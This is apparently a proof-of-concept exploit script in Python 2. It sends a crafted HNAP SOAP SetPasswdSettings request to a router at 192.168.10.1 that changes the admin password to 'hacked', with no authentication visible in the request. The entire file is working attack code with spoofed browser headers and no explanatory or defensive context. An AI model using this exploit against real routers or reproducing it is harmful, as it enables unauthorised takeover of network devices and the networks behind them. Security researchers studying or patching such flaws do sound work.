# -*- coding:UTF-8 -*-
#!/usr/bin/env python2
import requests

IP='192.168.10.1'
datas ='<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetPasswdSettings xmlns="http://purenetworks.com/HNAP1/"><NewPassword>hacked</NewPassword><ChangePassword>true</ChangePassword></SetPasswdSettings></soap:Body></soap:Envelope>'
length = len(datas)

headers = requests.utils.default_headers()
headers["Content-Length"]=str(length)
headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
headers["SOAPAction"] = '"http://purenetworks.com/HNAP1/SetPasswdSettings"'
headers["Content-Type"] = "text/xml; charset=UTF-8"
headers["Accept"]="*/*"
headers["Accept-Encoding"]="gzip, deflate"
headers["Accept-Language"]="zh-CN,zh;q=0.9,en;q=0.8"
headers["X-Requested-With"]="XMLHttpRequest"
headers["Origin"]="http://192.168.10.1"
headers["Connection"]="close"
headers["Referer"]="http://192.168.0.1/account.html"


r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=datas)
print r.text
